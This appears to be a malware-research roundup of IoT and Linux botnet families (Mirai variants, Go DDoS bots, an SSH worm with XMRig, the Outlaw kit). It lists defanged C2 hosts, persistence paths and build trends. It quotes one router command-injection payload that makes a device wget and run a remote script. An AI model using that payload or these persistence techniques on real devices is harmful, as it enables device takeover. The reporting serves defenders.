Families

Status is what abuse.ch, VirusTotal, eFeSpain and web search showed on 17 November. New means I found no prior public record.

superior (IoT + Android DDoS bot)

Telnet /s dropper from 77.239.124[.]167, ARM builds, HYDRA P2P mesh, ADB/Magisk persistence, ~36 flood methods. First reported by eFeSpain. New: a DWARF debug build, bricker.c, telemetry on 195.178.110[.]91:18081, two dropper revisions. Full post.

jkl Mirai

wget.sh/curl.sh/ftpget.sh from 45.90.163[.]37 (35–36 sources each) pulling jkl{arm,arm5,arm6,arm7,m68k,mips,mpsl,ppc,sh4,spc,x86}, run with selfrep. The biggest volume in the set. At least 5 rebuilds 7–11 November, same names, new hashes. Known: 192 URLhaus URLs, ThreatFox Mirai.

std000 Mirai

pxxxe313.sh (261 fetches) from 77.239.124[.]124:8085, pulling std000.{mips,mipsel,armv4l,x86_64,aarch64}. Rebuilt 5 and 11 November. Known: URLhaus since 23 October.

net_bot / kla.sh Mirai with a router injection

kla.sh from 160.119.66[.]206 pulls net.{arc,arm…x86_64}. 46 binaries carry an applyapp.cgi command injection that re-downloads the kit:

POST /applyapp.cgi
action_mode=SETROOTCERTIFICATE&cert_data=";cd /tmp;wget hxxp://176.65.139[.]196/bins/kla.sh ...

net.x86_64 persists via /var/tmp/.sys_recovery.sh (cron @reboot and a systemd ExecStart) and logs to /tmp/proxy_err.log, so it proxies as well as floods. Known: both hosts on URLhaus and ThreatFox; eFeSpain covers 176.65.139[.]0/24.

Go ServerIP/BotToken bot

Go 1.24, configured by -ldflags "-X main.ServerIP=176.65.139[.]201 -X main.BotToken=759c464f-ec77-4745-a1b8-70b16d2c31ce". Second C2 85.215.73[.]250. Functions: performHandshake, pingLoopEncrypted, reportReconEncrypted, handleAttackCommand, handleExec, handleUpdate, isL7Shape. MalwareBazaar labels it Mirai; it isn’t Mirai code. Its C2 shares a /24 with the kla.sh campaign. Known: hash on MalwareBazaar since 4 October, both C2s on ThreatFox.

Go “*Blast” DDoS bot

8 builds for x86, x86-64, ARM, AArch64 and MIPS; Go 1.25.0 and 1.27.2, one built on Windows. synBlast, ackBlast, greBlast, dnsBlast, httpBlast, udpRandBlast, plus persist, addCron, lockDirs, xorDecode. Burst on 13–14 October. Known: MalwareBazaar DDoSAgent, VT abrisk.

Go SSH worm with an XMRig loader

30 MB, Go 1.18. spreader, sshtry, p2p*, protector, killxmrig, killnbminer, antikill, launchgodmode, startupmanager, updater. Embedded base64 ELF payloads, a runtime XMRig config (xmrig_poolAddr/poolUser), Discord references, persistence as /lib/systemd/system/systemd-worker.service. Discord plus SSH brute force plus XMRig resembles Diicot tradecraft; unconfirmed. ~17 further uploads were truncated copies of the same build. Known: MalwareBazaar since 2023.

Outlaw “.rsync” kit

~25 dota-style tarballs from 31 October (3 complete). a/ miner (crond) with a rival-miner killer; b/ base64 Perl Shellbot (processo 'edac0', IRC #001 on 179.43.139[.]83:443 and 31.56.209[.]129:443); c/ kthreadadd32/64 SSH scanner (UPX); clean.sh that removes rival malware (RedTail, kswpad, .sshd); cron 5 6 */2 * 0 $dir/a/upd. Delivered alongside the mdrfckr SSH key written to authorized_keys (51 sources in two days). Known: hash on MalwareBazaar (CoinMiner), 179.43.139[.]83 on ThreatFox (PerlBot); 31.56.209[.]129 not on ThreatFox or URLhaus.

systemd-baby

ARM bot from 77.239.124[.]172 with 184 persistence paths and planted decoy C2s. New as a family write-up; a related x86-64 build was on MalwareBazaar from 18 October. Full post.

1,300-byte ARM stub

Echo-written downloader that fetches a binary from port 2345. Three builds differ only in the 4-byte C2: 129.121.115[.]43, 194.35.120[.]124, 101.53.134[.]34 (the last New). Full post.

Trends

One /24, three families. 77.239.124[.]0/24 served std000 (.124), superior (.167) and systemd-baby (.172). Shared hosting, not proof of one operator. eFeSpain traces the block’s history.

Fast rebuilds. jkl: 5 builds in 5 days. std000: 2 in a week. superior’s dropper: 5 revisions in a day. The ARM stub: a new hash each time its C2 moved. Hash IOCs go stale fast; match on hosts, URIs and code.

Bots evicting bots. superior ships competitor killers and squats ADB; the Outlaw kit’s clean.sh removes rival miners; the Go worm kills other XMRig and NBMiner instances.

Android boxes. superior persists via ADB on 5555 and Magisk/KernelSU; systemd-baby writes Android init.rc and Magisk hooks.

Mislabels. The Go ServerIP bot is filed as Mirai; systemd-baby’s decoy domains sit on ThreatFox as real C2.
